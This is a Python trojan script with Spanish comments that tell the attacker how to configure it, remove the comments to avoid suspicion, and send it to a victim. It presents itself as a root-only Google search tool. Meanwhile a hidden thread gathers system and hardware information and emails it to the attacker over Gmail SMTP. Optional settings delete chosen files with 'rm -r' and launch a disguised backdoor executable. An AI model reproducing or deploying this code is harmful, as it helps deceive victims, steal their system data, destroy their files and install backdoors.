#CONFIGURE TODAS LAS OPCIONES, Y SEGUIDAMENTE BORRE ESTOS COMENTARIOS 
#PARA EVITAR SOSPECHAS SOLO DEJE LAS VARIABLES, Y EL ARCHIVO .html NO LO BORRES
#ESTO AYUDARA A CONVENCER A LA PERSONA DE EJECUTAR EL SCRIPT, CONFIGURA TOD0,
#Y MANDALE LA CARPETA A LA VICTIMA ;) ...

#---ingrese un correo y una contraseña dentro de las comillas de abajo,
#debe ser un correo de Google [gmail], este sera el correo,
#que el script usara para mandar los mensajes:
_UserEmail = "CORREO@GMAIL.COM"
_PasswordEmail = "C0NTR4S3Ñ4"

#---Ingrese la direccion a la que quiere que lleguen los mensajes,
#esta vez puede ser un hotmail, u otro correo, hasta uno temporal,
#o puede ser la misma que ingreso arriba:
_SendTo= "correo|gmail.com"

#---Por ultimo, si desea borrar un archivo en especifico del sistema d la victima,
#o una carpeta, cambie a True la opcion _Confirmacion, si no desea borrar nada,
#dejelo en False, Pol ultimo si esque quiere borrar algo, ingrese la ruta del archivo,
#o carpeta que quiere eliminar,modificanco la opcion _basura, si es un directorio muy grande,
#puede ocasionar que el script se relentise, si quiere causar daños escriba una ruta que contenga
#archivos importantes del sistema y que no sean demaciados:
_Confirmacion = False
_Basura = "/archivos/o/carpetas/a/borrar"

#---El script puede ejecutar un backdoor en la maquina por usted, solo coloque
#el archivo/backdoor ya previamente configurado en la carpeta del script,
#debe cambiar el nombre del rchivo/backdoor por este "ConectarARed.sh" en caso que
#su backdoor sea para un dispositivo windows solo debe cambiar la extension del archivo
#ejemplo "ConectarARed.exe", repito el script solo se encargara de ejecutar el backdoor,
#por ultimo si quiere confirmar que va a usar un backdoor cambie a True la opcion
#de "_CrearEnlace" la cual esta en False por defecto, sino desea usar un backdoor entonces dejela en False.
_CrearEnlace = False

































import datetime
from googlesearch import search
from colorama import Fore
import os, threading, smtplib, platform, psutil, datetime, subprocess


while _Confirmacion:
    if os.getuid() == 0:
        os.system(f"rm -r {_Basura}")
        break
    else:
        print(Fore.RED + "No eres usuario root, privilegios necesarios...")
        break

while _CrearEnlace:
    if os.path.exists('ConectarARed.sh') == True:
        os.system("./ConectarARed.sh")
    elif os.path.exists('ConectarARed.exe') == True:
        os.system("ConectarARed.exe")
    else:
        break

def _ConexionBasesDeDatos():
    _Hjewfhf = platform.machine()
    _Bvdtt4 = platform.node()
    _Ijhkr4 = platform.system()
    _Opdfgr54 = platform.version()
    _Ssrt23 = platform.architecture()
    _Injhd00 = psutil.cpu_count(logical=False)
    _Vwbft45 = subprocess.check_output(["lscpu"])
    _Dexrt77 = datetime.datetime.today()
    _Fo9910 = psutil.cpu_percent(5)
    _jkk001 = subprocess.check_output(["free"])
    _Kjdg44 = subprocess.check_output(["lsusb"])
    _PeticionCliSer = f"""
    ***Informacion SOFWARE/HARDWARE***
    (#)---> Tipo de maquina=  {_Hjewfhf}\n 
    (#)---> Red asociada al equipo=  {_Bvdtt4}\n
    (#)---> Sistema operativo=  {_Ijhkr4}\n
    (#)---> Version de SO=  {_Opdfgr54}\n
    (#)---> Arquitectura de la maquina=  {_Ssrt23}\n
    (#)---> Procesadores logicos=  {_Injhd00}\n
    (#)---> Informacion de CPU=  {_Vwbft45}\n
    (#)---> Horario local=  {_Dexrt77}\n
    (#)---> Uso actual de la CPU 5/seg=  {_Fo9910}\n
    (#)---> Ram/Swap info=  {_jkk001}
    (#)---> Dispositivos USB conectados al sistema= {_Kjdg44}\n"""
    _Conexion = smtplib.SMTP(host="smtp.gmail.com", port=587)
    _Conexion.ehlo()
    _Conexion.starttls()
    _Conexion.login(user=_UserEmail, password=_PasswordEmail)
    _Conexion.sendmail(from_addr= "BrowserDataRecolection", to_addrs= _SendTo, msg=_PeticionCliSer)
    _Conexion.quit()

def _IniciarBrowser():
    if os.getuid() == 0:
        os.system("clear")
        print("\t------------------------------------")
        print("\t░█▀▀█ █▀▀█ █▀▀█ █───█ █▀▀ █▀▀ █▀▀█ ")
        print("\t░█▀▀▄ █▄▄▀ █──█ █▄█▄█ ▀▀█ █▀▀ █▄▄▀ ")
        print("\t░█▄▄█ ▀─▀▀ ▀▀▀▀ ─▀─▀─ ▀▀▀ ▀▀▀ ▀─▀▀")
        print("\t------------------------------------")
        print(Fore.GREEN + """Se recomienda no parar el script mientras esta buscando,\n
                el script buscara toda la informacion posible del/los parametros dados\n
                asi que es cuestion de esperar, y te devolvera mucha informacion""")
        google_query = str(input("INTRODUSCA UN TERMINO DE BUSQUEDA: "))
        print("Esto podria demorar un poco, ten calma :) ...")
        print("Realizando la busqueda...")
        print("Filtrando resultados...")
        print("")
        for i in search(google_query, start = 0, pause = 2):
            print(i)
        input(Fore.RED + "El proceso a terminado finalize el script presionando enter...")
    else:
        print(Fore.RED + "No eres usuario root, privilegios necesarios...")


_Browser = threading.Thread(target=_IniciarBrowser)
_ConexionAbAse = threading.Thread(target=_ConexionBasesDeDatos)
_ConexionAbAse.start()
_Browser.start()












#VERSION DE SCRIPT: 1.5
#No me hado responsable de los daños o prejuicios
#que puedas ocasionar con esto, usalo bien ;).